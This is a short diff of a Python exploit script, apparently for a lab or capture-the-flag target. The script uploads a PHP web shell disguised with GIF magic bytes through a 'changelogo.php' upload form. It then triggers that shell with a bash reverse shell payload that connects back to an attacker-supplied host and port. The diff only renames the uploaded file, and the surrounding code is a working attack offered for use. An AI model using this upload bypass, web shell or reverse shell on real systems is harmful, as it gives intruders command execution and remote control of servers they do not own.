@@ -10,7 +10,7 @@ def upload_shell(target_url):
     upload_url = target_url + "/sparklays/design/changelogo.php"
     shell_code = b"GIF8;\n<?php system($_REQUEST['shell']); ?>"
     files = {
-        "file": ("test3.php5", shell_code, "image/gif")
+        "file": ("shell.php5", shell_code, "image/gif")
     }
     data = {
         "submit": "upload file"
@@ -34,7 +34,7 @@ def trigger_shell(target_url, lhost, lport):
     """
     Sends a POST request to trigger the uploaded web shell with a reverse shell payload.
     """
-    shell_url = target_url + "/sparklays/design/uploads/test3.php5"
+    shell_url = target_url + "/sparklays/design/uploads/shell.php5"
     payload = {
         "shell": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
     }
